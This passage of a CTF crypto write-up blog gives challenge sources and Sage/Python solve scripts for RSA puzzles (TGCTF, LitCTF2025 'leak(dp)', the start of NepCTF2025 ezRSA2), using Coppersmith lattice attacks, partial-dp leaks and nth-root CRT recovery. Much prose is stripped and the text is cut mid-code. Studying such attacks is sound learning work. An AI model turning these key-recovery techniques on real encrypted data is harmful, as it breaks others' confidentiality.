class="number">2</span>^<span class="number">288</span>+p00</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X = <span class="number">2</span>**<span class="number">224</span>,beta=<span class="number">0.4</span>,epsilon=<span class="number">0.02</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:       </span><br><span class="line">        p = <span class="built_in">int</span>(roots[<span class="number">0</span>])*<span class="number">2</span>^<span class="number">288</span> + p00</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mtext></mtext><mi></mi><mtext></mtext></mrow><annotation encoding="application/x-tex">e\phi </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">e</span><span class="mord cjk_fallback"></span><span class="mord mathnormal"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">p = <span class="number">12424840247075830662687097292458444573014198016321428995092662043898159667123240573630892907827505266982898641483333170032514244713840745287869771915696311</span></span><br><span class="line">q = <span class="number">12602471198163266643743702664647336358595911975665358584258749238146841559843060594842063473155049870396568542257767865369797827796765830093256146584311989</span></span><br><span class="line">e = bytes_to_long(<span class="string">&quot;&quot;</span>.encode())</span><br><span class="line">n = <span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">c = <span class="number">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br><span class="line"></span><br><span class="line">ps = [p, q]</span><br><span class="line">checker = genHeaderChecker(<span class="string">&#x27;TGCTF&#x27;</span>)</span><br><span class="line">res = nthRSA_n(c, e, ps, checker=checker)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">  flag = long_to_bytes(<span class="built_in">int</span>(r))</span><br><span class="line">  <span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># TGCTF&#123;__&#125;</span></span><br></pre></td></tr></table></figure><h1 id="litctf2025-leakdp"><a class="markdownIt-Anchor" href="#litctf2025-leakdp"></a> LitCTF2025 - leak(dp)</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p,q,e = getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>),getPrime(<span class="number">101</span>)</span><br><span class="line">n = p*q</span><br><span class="line">temp = gmpy2.invert(e,p-<span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">hint = temp&gt;&gt;<span class="number">180</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;hint = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">e = 1915595112993511209389477484497</span></span><br><span class="line"><span class="string">n = 12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line"><span class="string">c = 5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line"><span class="string">hint = 10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo></mo><mi>d</mi><mi>p</mi><mo></mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*dp\equiv 1(mod\ p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo></mo><mo stretchy="false">(</mo><mi>d</mi><mi>p</mi><mi mathvariant="normal">_</mi><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mo></mo><mo stretchy="false">(</mo><mi>p</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e*(dp\_high+x)=k*(p-1)+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo></mo><mo stretchy="false">(</mo><mi>d</mi><mi>p</mi><mi mathvariant="normal">_</mi><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mi>k</mi><mo></mo><mn>1</mn><mo></mo><mn>0</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*(dp\_high+x)+k-1\equiv 0(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><br /><code>e</code><a href="https://www.cnblogs.com/vconlln/p/17066500.html">copper</a><strong>copper</strong></p><p><code>m</code><code>d</code>3<code>flag</code>(13)</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>e</mi><mo></mo><mi>d</mi><mi>p</mi></mrow></msup><mo></mo><mn>2</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">2^{e*dp}\equiv 2(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">p</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mi>G</mi><mi>C</mi><mi>D</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mrow><mi>e</mi><mo></mo><mi>d</mi><mi>p</mi></mrow></msup><mo></mo><mn>2</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p=GCD(2^{e*dp}-2,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0991079999999998em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">p</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">e = <span class="number">1915595112993511209389477484497</span></span><br><span class="line">n = <span class="number">12058282950596489853905564906853910576358068658769384729579819801721022283769030646360180235232443948894906791062870193314816321865741998147649422414431603039299616924238070704766273248012723702232534461910351418959616424998310622248291946154911467931964165973880496792299684212854214808779137819098357856373383337861864983040851365040402759759347175336660743115085194245075677724908400670513472707204162448675189436121439485901172477676082718531655089758822272217352755724670977397896215535981617949681898003148122723643223872440304852939317937912373577272644460885574430666002498233608150431820264832747326321450951</span></span><br><span class="line">c = <span class="number">5408361909232088411927098437148101161537011991636129516591281515719880372902772811801912955227544956928232819204513431590526561344301881618680646725398384396780493500649993257687034790300731922993696656726802653808160527651979428360536351980573727547243033796256983447267916371027899350378727589926205722216229710593828255704443872984334145124355391164297338618851078271620401852146006797653957299047860900048265940437555113706268887718422744645438627302494160620008862694047022773311552492738928266138774813855752781598514642890074854185464896060598268009621985230517465300289580941739719020511078726263797913582399</span></span><br><span class="line">hint = <span class="number">10818795142327948869191775315599184514916408553660572070587057895748317442312635789407391509205135808872509326739583930473478654752295542349813847128992385262182771143444612586369461112374487380427668276692719788567075889405245844775441364204657098142930</span></span><br><span class="line">leak = hint &lt;&lt; <span class="number">180</span></span><br><span class="line">PR.&lt;x,y&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = e*(leak + x) + y -<span class="number">1</span></span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">180</span>,<span class="number">2</span>^e.bit_length()),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    dp = leak + root[<span class="number">0</span>]</span><br><span class="line">    p = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, e*dp, n) -<span class="number">2</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line">    d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure><h1 id="nepctf2025-ezrsa2"><a class="markdownIt-Anchor" href="#nepctf2025-ezrsa2"></a> NepCTF2025 - ezRSA2</h1><blockquote><p>Easy RSA, easy strategy. No need to brute force.<br />Perhaps its easier than ezRSA in NepCTF 2024.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, getRandomNBitInteger, GCD, inverse, long_to_bytes, bytes_to_long, sieve_base</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_parameters</span>(<span class="params">gamma=<span class="number">0.33</span>, beta=<span class="number">0.33</span></span>):</span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    N = p*q</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = getRandomNBitInteger(<span class="built_in">int</span>(<span class="number">2048</span>*beta))</span><br><span class="line">        <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    e = inverse(d, phi)</span><br><span class="line">    </span><br><span class="line">    hints = []</span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sieve_base)):</span><br><span class="line">        li = sieve_base[i]</span><br><span class="line">        hints.append(d%li)</span><br><span class="line">        M *= li</span><br><span class="line">        <span class="keyword">if</span> M.bit_length() &gt;= <span class="number">1024</span>*gamma:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> e, N, hints</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    e,N,hints = gen_parameters()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e=<span class="subst">&#123;<span class="built_in">hex</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;N=<span class="subst">&#123;<span class="built_in">hex</span>(N)&#125;</span>\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hints=<span class="subst">&#123;hints&#125;</span>\n&#x27;</span>)</span><br><span class="line">    